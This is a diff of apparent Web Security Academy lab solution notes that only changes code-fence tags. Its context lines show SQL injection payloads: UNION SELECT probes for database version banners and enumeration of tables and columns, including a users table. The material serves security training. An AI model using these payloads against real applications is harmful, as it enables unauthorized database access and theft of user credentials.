@@ -14,7 +14,7 @@ https://ac411f5e1efd6df0807300ed00e30057.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' ORDER BY 1,2--
 ' UNION SELECT 'a','b' FROM dual--
 ' UNION SELECT banner, NULL FROM v$version--
@@ -40,7 +40,7 @@ https://ac8b1f3e1ea6a87a804d17df00960002.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' ORDER BY 1,2--
 ' UNION SELECT 'a','b'-- banner
 ' UNION SELECT @@version, NULL-- banner
@@ -68,7 +68,7 @@ https://ac641fb21ef453a780df0e850024008d.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' ORDER BY 1,2--
 ' UNION SELECT table_name, table_schema FROM information_schema.tables--
 ' UNION SELECT table_name, column_name FROM information_schema.columns--
@@ -97,7 +97,7 @@ https://acbd1f041f52bf1b802b011b007d00b2.web-security-academy.net/filter?categor
 
 Solution:
 
-```SQL
+```sql
 ' ORDER BY 1,2--
 ' UNION SELECT table_name, NULL FROM all_tables--
 ' UNION SELECT table_name, column_name FROM all_tab_columns WHERE table_name = 'USERS_VMNLRN'--
